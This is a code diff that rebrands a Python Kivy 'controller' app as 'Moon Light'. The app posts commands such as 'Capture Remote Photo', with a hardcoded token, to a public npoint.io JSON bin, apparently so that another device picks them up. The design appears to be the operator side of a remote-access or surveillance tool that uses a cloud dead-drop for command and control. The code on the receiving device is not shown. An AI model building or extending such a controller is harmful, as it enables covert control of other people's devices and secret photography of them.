@@ -6,15 +6,19 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
 from kivy.uix.label import Label
 
-# Tera npoint.io link yahan set ho gaya hai
 API_URL = "https://api.npoint.io/7d91bc63aa9160b6858b"
-SECRET_TOKEN = "bhai123"
+SECRET_TOKEN = "moonlightdead"
 
-class ControllerApp(App):
+class MoonLightControllerApp(App):
     def build(self):
+        self.title = "Moon Light"
         layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
         
-        self.status_label = Label(text="Status: Controller Ready", size_hint_y=None, height=50)
+        self.status_label = Label(
+            text="Status: Moon Light Controller Ready", 
+            size_hint_y=None, 
+            height=50
+        )
         layout.add_widget(self.status_label)
         
         btn_photo = Button(text="📸 Capture Remote Photo", background_color=(0.1, 0.6, 0.8, 1))
@@ -40,7 +44,6 @@ class ControllerApp(App):
 
     def _post_to_cloud(self, cmd_name):
         try:
-            self.status_label.text = f"Sending: {cmd_name}..."
             payload = {"command": cmd_name, "token": SECRET_TOKEN}
             data_bytes = json.dumps(payload).encode('utf-8')
             
@@ -53,15 +56,11 @@ class ControllerApp(App):
             
             with urllib.request.urlopen(req, timeout=5) as response:
                 if response.status == 200:
-                    self.status_label.text = f"Success: {cmd_name} sent!"
+                    print(f"Success: {cmd_name} sent!")
                 else:
-                    self.status_label.text = "Failed to send."
+                    print("Failed to send.")
         except Exception as e:
-            self.status_label.text = "Connection Error!"
+            print(f"Connection Error: {str(e)}")
 
 if __name__ == '__main__':
-    ControllerApp().run()
-
-
-
-
+    MoonLightControllerApp().run()
